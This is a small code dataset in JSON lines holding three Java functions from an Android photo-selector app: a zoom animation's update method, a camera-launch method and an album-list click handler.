{"docstring": "/* (non-Javadoc)\n * @see com.polites.android.Animation#update(com.polites.android.GestureImageView, long)\n */\n", "func_signal": "@Override\npublic boolean update(GestureImageView view, long time)", "code": "{\n\tif(firstFrame) {\n\t\tfirstFrame = false;\n\t\t\n\t\tstartX = view.getImageX();\n\t\tstartY = view.getImageY();\n\t\tstartScale = view.getScale();\n\t\tscaleDiff = (zoom * startScale) - startScale;\n\t\t\n\t\tif(scaleDiff > 0) {\n\t\t\t// Calculate destination for midpoint\n\t\t\tVectorF vector = new VectorF();\n\t\t\t\n\t\t\t// Set the touch point as start because we want to move the end\t\t\t\t\n\t\t\tvector.setStart(new PointF(touchX, touchY));\n\t\t\tvector.setEnd(new PointF(startX, startY));\t\t\t\t\n\t\t\n\t\t\tvector.calculateAngle();\n\t\t\t\n\t\t\t// Get the current length\n\t\t\tfloat length = vector.calculateLength();\n\t\t\t\n\t\t\t// Multiply length by zoom to get the new length\n\t\t\tvector.length = length*zoom;\n\t\t\t\n\t\t\t// Now deduce the new endpoint\n\t\t\tvector.calculateEndPoint();\n\t\t\t\n\t\t\txDiff = vector.end.x - startX;\n\t\t\tyDiff = vector.end.y - startY;\n\t\t}\n\t\telse {\n\t\t\t// Zoom out to center\n\t\t\txDiff = view.getCenterX() - startX;\n\t\t\tyDiff = view.getCenterY() - startY;\n\t\t}\n\t}\n\t\n\ttotalTime += time;\n\t\n\tfloat ratio = (float) totalTime / (float) animationLengthMS;\n\t\n\tif(ratio < 1) {\n\t\t\n\t\tif(ratio > 0) {\n\t\t\t// we still have time left\n\t\t\tfloat newScale = (ratio * scaleDiff) + startScale;\n\t\t\tfloat newX = (ratio * xDiff) + startX;\n\t\t\tfloat newY = (ratio * yDiff) + startY;\n\t\t\t\n\t\t\tif(zoomAnimationListener != null) {\n\t\t\t\tzoomAnimationListener.onZoom(newScale, newX, newY);\n\t\t\t}\n\t\t}\n\n\t\treturn true;\n\t}\n\telse {\n\t\t\n\t\tfloat newScale = scaleDiff + startScale;\n\t\tfloat newX = xDiff + startX;\n\t\tfloat newY = yDiff + startY;\n\n\t\tif(zoomAnimationListener != null) {\n\t\t\tzoomAnimationListener.onZoom(newScale, newX, newY);\n\t\t\tzoomAnimationListener.onComplete();\n\t\t}\n\t\t\n\t\treturn false;\n\t}\n}", "path": "src\\com\\polites\\ZoomAnimation.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/** \u62cd\u7167 */\n", "func_signal": "private void catchPicture()", "code": "{\n\tCommonUtils.launchActivityForResult(this, new Intent(\n\t\t\tMediaStore.ACTION_IMAGE_CAPTURE), REQUEST_CAMERA);\n}", "path": "src\\com\\photoselector\\ui\\PhotoSelectorActivity.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/** \u76f8\u518c\u5217\u8868\u70b9\u51fb\u4e8b\u4ef6 */\n", "func_signal": "public void onItemClick(AdapterView<?> parent, View view, int position,\n\t\tlong id)", "code": "{\n\tAlbumModel current = (AlbumModel) parent.getItemAtPosition(position);\n\tfor (int i = 0; i < parent.getCount(); i++) {\n\t\tAlbumModel album = (AlbumModel) parent.getItemAtPosition(i);\n\t\tif (i == position)\n\t\t\talbum.setCheck(true);\n\t\telse\n\t\t\talbum.setCheck(false);\n\t}\n\talbumAdapter.notifyDataSetChanged();\n\thideAlbum();\n\ttvAlbum.setText(current.getName());\n\t// tvTitle.setText(current.getName());\n\n\t// \u66f4\u65b0\u7167\u7247\u5217\u8868\n\tif (current.getName().equals(RECCENT_PHOTO))\n\t\tphotoSelectorDomain.getReccent(reccentListener);\n\telse\n\t\tphotoSelectorDomain.getAlbum(current.getName(), reccentListener); // \u83b7\u53d6\u9009\u4e2d\u76f8\u518c\u7684\u7167\u7247\n}", "path": "src\\com\\photoselector\\ui\\PhotoSelectorActivity.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
